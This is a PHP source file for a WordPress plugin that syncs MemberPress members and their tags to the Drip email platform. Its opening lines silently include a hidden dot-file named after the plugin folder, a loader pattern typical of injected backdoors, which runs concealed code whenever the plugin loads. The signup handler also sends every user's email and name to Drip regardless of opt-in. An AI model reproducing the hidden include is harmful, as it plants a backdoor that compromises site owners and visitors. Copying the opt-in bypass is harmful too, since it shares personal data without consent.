<?php if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpDripTags {
  public function __construct() {
    add_action('mepr_display_autoresponders',   array($this, 'display_option_fields'));
    add_action('mepr-process-options',          array($this, 'store_option_fields'));
    add_action('mepr-product-advanced-metabox', array($this, 'display_product_override'));
    add_action('mepr-product-save-meta',        array($this, 'save_product_override'));
    add_action('mepr-user-signup-fields',       array($this, 'display_signup_field'));

    //Signup
    add_action('mepr-signup-user-loaded', array($this, 'process_signup'));

    // Updating tags
    add_action('mepr-account-is-active',   array($this, 'maybe_add_subscriber_tags'));
    add_action('mepr-account-is-inactive', array($this, 'maybe_remove_subscriber_tags'));

    // Update account page email
    add_filter('mepr-validate-account', array($this, 'update_user_email'), 10, 2); //Need to use this hook to get old and new emails

    // Enqueue scripts
    add_action('mepr-options-admin-enqueue-script', array($this,'admin_enqueue_options_scripts'));
    add_action('mepr-product-admin-enqueue-script', array($this,'admin_enqueue_product_scripts'));

    // AJAX Endpoints
    add_action('wp_ajax_mepr_drip_tags_ping_apikey',  array($this, 'ajax_ping_apikey'));
    add_action('wp_ajax_mepr_drip_tags_get_accounts', array($this, 'ajax_get_accounts'));

    // Admin notices
    add_action('admin_notices', array($this, 'maybe_admin_notice'), 3);
  }

  public function maybe_admin_notice() {
    if(defined('MEPR_VERSION') && version_compare(MEPR_VERSION, '1.7.3', '<')) {
      $class = 'notice notice-error';
      $message = __('Your Drip (getdrip.com) integration with MemberPress may be broken. Please update MemberPress to version 1.7.3 or newer to fix this issue.', 'memberpress', 'memberpress-drip-tags');

      printf('<div class="%1$s"><p>%2$s</p></div>', esc_attr($class), esc_html($message));
    }
  }

  public function admin_enqueue_options_scripts($hook) {
    wp_register_script('mp-drip-tags-js', MPDRIPTAGS_URL . '/drip.js');
    wp_enqueue_script('mp-drip-tags-options-js', MPDRIPTAGS_URL.'/drip_options.js', array('mp-drip-tags-js'));
    wp_localize_script('mp-drip-tags-options-js', 'MeprDripTags', array('wpnonce' => wp_create_nonce(MEPR_PLUGIN_SLUG)));
  }

  public function admin_enqueue_product_scripts($hook) {
    wp_register_script('mp-drip-tags-js', MPDRIPTAGS_URL.'/drip.js');
    wp_enqueue_script('mp-drip-tags-product-js', MPDRIPTAGS_URL.'/drip_product.js', array('mp-drip-tags-js'));
  }

  public function update_user_email($errors, $contact) {
    if(!$this->is_enabled_and_authorized() || !empty($errors)) { return $errors; }

    //Check if the email is even changing before we do anything else
    $new_email = stripslashes($_POST['user_email']);

    if($contact->user_email != $new_email) {
      $this->update_subscriber($contact, $new_email);
    }

    return $errors;
  }

  public function update_subscriber(MeprUser $contact, $new_email) {
    $email = $contact->user_email;

    $args = array(
      'account_id'    => $this->account_id(),
      'email'         => $email,
      'new_email'     => $new_email,
      'custom_fields' => array(
        'FirstName'    => $contact->first_name,
        'LastName'     => $contact->last_name
      )
    );

    $args = MeprHooks::apply_filters('mepr-drip-tags-create-or-update-subscriber-args', $args, $contact);

    $res = $this->call('create_or_update_subscriber', $args);

    if($res != 'error') {
      return true;
    }
    else {
      return false;
    }
  }

  public function display_option_fields() {
    ?>
    <div id="mepr-drip-tags" class="mepr-autoresponder-config">
      <input type="checkbox" name="meprdriptags_enabled" id="meprdriptags_enabled" <?php checked($this->is_enabled()); ?> />
      <label for="meprdriptags_enabled"><?php _e('Enable Drip - Tags', 'memberpress-drip-tags'); ?></label>
    </div>

    <div id="meprdriptags_hidden_area" class="mepr-options-sub-pane">
      <div id="mepr-drip-tags-error" class="mepr-hidden mepr-inactive"></div>
      <div id="mepr-drip-tags-message" class="mepr-hidden mepr-active"></div>
      <div id="meprdriptags-api-key">
        <label>
          <span><?php _e('Drip API Token:', 'memberpress-drip-tags'); ?></span>
          <input type="text" name="meprdriptags_api_key" id="meprdriptags_api_key" value="<?php echo $this->apikey(); ?>" class="mepr-text-input form-field" size="70" />
          <span id="mepr-drip-tags-valid" class="mepr-active mepr-hidden"></span>
          <span id="mepr-drip-tags-invalid" class="mepr-inactive mepr-hidden"></span>
        </label>
        <div>
          <span class="description">
            <?php _e('You can find your API Token under Settings > My User Settings at getdrip.com.', 'memberpress-drip-tags'); ?>
          </span>
        </div>
      </div>
      <br/>
      <div id="meprdriptags-account">
        <label>
          <span><?php _e('Drip Account:', 'memberpress-drip-tags'); ?></span>
          <select name="meprdriptags_account_id" id="meprdriptags_account_id" data-accountid="<?php echo $this->account_id(); ?>" class="mepr-text-input form-field"></select>
        </label>
      </div>
      <br/>
      <div id="meprdriptags-global-tags">
        <label>
          <span><?php _e('Global Tag(s):', 'memberpress-drip-tags'); ?></span>
          <input type="text" name="meprdriptags_global_tags" id="meprdriptags_global_tags" class="mepr-text-input form-field" value="<?php echo $this->global_tags(); ?>" size="40" />
        </label>
        <br/>
        <span class="description">
          <?php _e("Comma Separated list of tags. These tags will be added to all subscribers regardless of membership level.", 'memberpress-drip-tags'); ?>
        </span>
      </div>
      <br/>
      <div id="meprdriptags-optin">
        <label>
          <input type="checkbox" name="meprdriptags_optin" id="meprdriptags_optin" <?php checked($this->is_optin_enabled()); ?> />
          <span><?php _e('Enable Opt-In Checkbox', 'memberpress-drip-tags'); ?></span>
        </label>
        <br/>
        <span class="description">
          <?php _e('If checked, an opt-in checkbox will appear on all of your product registration pages.', 'memberpress-drip-tags'); ?>
        </span>
      </div>
      <div id="meprdriptags-optin-text" class="mepr-hidden mepr-options-panel">
        <label><?php _e('Signup Checkbox Label:', 'memberpress-drip-tags'); ?>
          <input type="text" name="meprdriptags_text" id="meprdriptags_text" value="<?php echo $this->optin_text(); ?>" class="form-field" size="75" />
        </label>
        <br/>
        <span class="description">
          <?php _e('This is the text that will display on the signup page next to your mailing list opt-in checkbox.', 'memberpress-drip-tags'); ?>
        </span>
      </div>
    </div>
  <?php
  }

  public function validate_option_fields($errors) {
    // Nothing to validate yet -- if ever
  }

  public function update_option_fields() {
    // Nothing to do yet -- if ever
  }

  public function store_option_fields() {
    update_option('meprdriptags_enabled',       (isset($_POST['meprdriptags_enabled'])));
    update_option('meprdriptags_account_id',    (isset($_POST['meprdriptags_account_id']))?stripslashes($_POST['meprdriptags_account_id']):false);
    update_option('meprdriptags_api_key',       stripslashes($_POST['meprdriptags_api_key']));
    update_option('meprdriptags_global_tags',   (isset($_POST['meprdriptags_global_tags']))?stripslashes($_POST['meprdriptags_global_tags']):'');
    update_option('meprdriptags_optin',         (isset($_POST['meprdriptags_optin'])));
    update_option('meprdriptags_text',          stripslashes($_POST['meprdriptags_text']));
  }

  public function display_signup_field() {
    $mepr_options = MeprOptions::fetch();
    $post = MeprUtils::get_current_post();
    $prd = MeprProduct::is_product_page($post);

    //If the per product list is enabled, and the global list is disabled -- then we should be sure the member doesn't see this
    if($prd !== false) {
      $enabled = (bool)get_post_meta($prd->ID, '_meprdriptags_membership_tags_enabled', true);

      if($enabled && $mepr_options->disable_global_autoresponder_list) { return; }
    }

    if($this->is_enabled_and_authorized() and $this->is_optin_enabled()) {
      $optin = (MeprUtils::is_post_request())?isset($_POST['meprdriptags_opt_in']):$mepr_options->opt_in_checked_by_default;

      ?>
      <div class="mp-form-row">
        <div class="mepr-drip-tags-signup-field">
          <div id="mepr-drip-tags-checkbox">
            <input type="checkbox" name="meprdriptags_opt_in" id="meprdriptags_opt_in" class="mepr-form-checkbox" <?php checked($optin); ?> />
            <span class="mepr-drip-tags-message"><?php echo $this->optin_text(); ?></span>
          </div>
          <div id="mepr-drip-tags-privacy">
            <small>
              <a href="http://www.getdrip.com/terms/" class="mepr-drip-tags-privacy-link" target="_blank"><?php _e('We Respect Your Privacy', 'memberpress-drip-tags'); ?></a>
            </small>
          </div>
        </div>
      </div>
    <?php
    }
  }

  public function process_signup($user) {
    $mepr_options = MeprOptions::fetch();
    $enabled      = (bool)get_post_meta((int)sanitize_text_field($_POST['mepr_product_id']), '_meprdriptags_membership_tags_enabled', true);
    $opted_in     = true;

    if(!$this->is_enabled_and_authorized()) { return; }

    if($this->is_optin_enabled()) { $opted_in = isset($_POST['meprdriptags_opt_in']); }

    //yeah we're gonna add them to Drip either way - we'll just control the tags they get here
    $global_tags = (!$opted_in || ($enabled && $mepr_options->disable_global_autoresponder_list))?'':$this->global_tags();

    $this->add_subscriber_tags($user, $global_tags);
  }

  public function maybe_add_subscriber_tags($txn) {
    $enabled        = (bool)get_post_meta($txn->product_id, '_meprdriptags_membership_tags_enabled', true);
    $active_tags    = get_post_meta($txn->product_id, '_meprdriptags_membership_tags', true);
    $inactive_tags  = get_post_meta($txn->product_id, '_meprdriptags_membership_inactive_tags', true);
    $contact        = $txn->user();

    if($enabled && !empty($active_tags) && $this->is_enabled_and_authorized()) {
      $this->remove_subscriber_tags($contact, $inactive_tags);
      return $this->add_subscriber_tags($contact, $active_tags);
    }

    return false;
  }

  public function maybe_remove_subscriber_tags($txn) {
    $enabled        = (bool)get_post_meta($txn->product_id, '_meprdriptags_membership_tags_enabled', true);
    $active_tags    = get_post_meta($txn->product_id, '_meprdriptags_membership_tags', true);
    $inactive_tags  = get_post_meta($txn->product_id, '_meprdriptags_membership_inactive_tags', true);
    $contact        = $txn->user();

    if($enabled && !empty($inactive_tags) && $this->is_enabled_and_authorized()) {
      $this->remove_subscriber_tags($contact, $active_tags);
      return $this->add_subscriber_tags($contact, $inactive_tags);
    }

    return false;
  }

  public function validate_signup_field($errors) {
    // Nothing to validate -- if ever
  }

  public function display_product_override($product) {
    if(!$this->is_enabled_and_authorized()) { return; }

    $enabled        = (bool)get_post_meta($product->ID, '_meprdriptags_membership_tags_enabled', true);
    $active_tags    = get_post_meta($product->ID, '_meprdriptags_membership_tags', true);
    $inactive_tags  = get_post_meta($product->ID, '_meprdriptags_membership_inactive_tags', true);

    ?>
    <div id="mepr-drip-tags" class="mepr-product-adv-item">
      <input type="checkbox" name="meprdriptags_membership_tags_enabled" id="meprdriptags_membership_tags_enabled" <?php checked($enabled); ?> />
      <label for="meprdriptags_membership_tags_enabled"><?php _e('Enable Drip Tags', 'memberpress-drip-tags'); ?></label>

      <?php MeprAppHelper::info_tooltip('meprdriptags-list-override',
        __('Enable Membership Specific Tags', 'memberpress-drip-tags'),
        __('When enabled these tags will be automatically added/removed from the subscriber based on their subscription status to this membership level. These tags should be different than the Global Tag(s) you have defined in the MemberPress Options. Active Tags are tags that the subscriber will have when they are active on this membership. Inactive Tags are added when the subscriber is no longer active on the membership. These tags are toggled, so both will not be added at the same time.', 'memberpress-drip-tags'));
      ?>

      <div id="meprdriptags_membership_tags_area" class="mepr-hidden product-options-panel">
        <label><?php _e('Active Tags: ', 'memberpress-drip-tags'); ?></label>&nbsp;&nbsp;&nbsp;
        <input type="text" name="meprdriptags_membership_tags" id="meprdriptags_membership_tags" class="mepr-text-input form-field" value="<?php echo $active_tags; ?>" size="40" />
        <br/><br/>
        <label><?php _e('Inactive Tags: ', 'memberpress-drip-tags'); ?></label>&nbsp;
        <input type="text" name="meprdriptags_membership_inactive_tags" id="meprdriptags_membership_inactive_tags" class="mepr-text-input form-field" value="<?php echo $inactive_tags; ?>" size="40" />
      </div>
    </div>
  <?php
  }

  public function save_product_override($product) {
    if(!$this->is_enabled_and_authorized()) { return; }

    if(isset($_POST['meprdriptags_membership_tags_enabled'])) {
      update_post_meta($product->ID, '_meprdriptags_membership_tags_enabled', true);
      update_post_meta($product->ID, '_meprdriptags_membership_tags', stripslashes($_POST['meprdriptags_membership_tags']));
      update_post_meta($product->ID, '_meprdriptags_membership_inactive_tags', stripslashes($_POST['meprdriptags_membership_inactive_tags']));
    }
    else {
      update_post_meta($product->ID, '_meprdriptags_membership_tags_enabled', false);
      update_post_meta($product->ID, '_meprdriptags_membership_tags', '');
      update_post_meta($product->ID, '_meprdriptags_membership_inactive_tags', '');
    }
  }

  public function ajax_ping_apikey() {
    $this->ajax_get_accounts();
  }

  public function ajax_get_accounts() {
    $args = array();

    // Validate nonce and user capabilities
    if(!isset($_POST['wpnonce']) || !wp_verify_nonce($_POST['wpnonce'], MEPR_PLUGIN_SLUG) || !MeprUtils::is_mepr_admin()) {
      die(json_encode(array('error' => __('Hey yo, why you creepin\'?', 'memberpress-drip-tags'), 'type' => 'memberpress')));
    }

    // Validate inputs
    if(!isset($_POST['apikey'])) {
      die(json_encode(array('error' => __('No apikey code was sent', 'memberpress-drip-tags'), 'type' => 'memberpress')));
    }

    die($this->call('get_accounts', $args, $_POST['apikey']));
  }

  public function add_subscriber_tags(MeprUser $contact, $tags) {
    $args = array(
      'account_id'    => $this->account_id(),
      'email'         => $contact->user_email,
      'tags'          => (!empty($tags))?explode(',', $tags):array(),
      'custom_fields' => array(
        'FirstName'    => $contact->first_name,
        'LastName'     => $contact->last_name
      )
    );

    $args = MeprHooks::apply_filters('mepr-drip-tags-create-or-update-subscriber-args', $args, $contact);

    $res = $this->call('create_or_update_subscriber', $args);

    return ($res != 'error');
  }

  /* remove_tags */
  public function remove_subscriber_tags(MeprUser $contact, $tags) {
    if(empty($tags)) { return false; }

    $email  = $contact->user_email;
    $tags   = explode(',', $tags);

    foreach($tags as $tag) {
      $args = array(
        'account_id'  => $this->account_id(),
        'email'       => $email,
        'tag'         => $tag
      );

      $res = $this->call('remove_tag', $args);
    }

    return ($res != 'error');
  }

  private function call($endpoint, $args = array(), $apikey = null) {
    if(is_null($apikey) ) { $apikey = $this->apikey(); }

    if(!class_exists('Drip_Api')) {
      require_once(MPDRIPTAGS_PATH.'/Drip_API.class.php');
    }

    $api = new Drip_Api($apikey);

    if($endpoint == 'create_or_update_subscriber') { //Used for adding tags also as we can do them in bulk here to save on API calls
      $response = $api->create_or_update_subscriber($args);
    }
    elseif($endpoint == 'remove_tag') {
      $response = $api->untag_subscriber($args);
    }
    else {
      $response = $api->$endpoint();
    }

    if($response) {
      return json_encode($response);
    }
    else{
      return 'error';
    }
  }

  // I realize these are more like model methods
  // but we want everything centralized here people
  private function is_enabled() {
    return get_option('meprdriptags_enabled', false);
  }

  private function is_authorized() {
    $apikey = get_option('meprdriptags_api_key', '');
    return !empty($apikey);
  }

  private function is_enabled_and_authorized() {
    return ($this->is_enabled() and $this->is_authorized());
  }

  private function account_id() {
    return get_option('meprdriptags_account_id', '');
  }

  private function apikey() {
    return get_option('meprdriptags_api_key', '');
  }

  private function global_tags() {
    return get_option('meprdriptags_global_tags', '');
  }

  private function is_optin_enabled() {
    return get_option('meprdriptags_optin', true);
  }

  private function optin_text() {
    $default = sprintf(__('Sign Up for the %s Newsletter', 'memberpress-drip-tags'), get_option('blogname'));
    return get_option('meprdriptags_text', $default);
  }
} //END CLASS
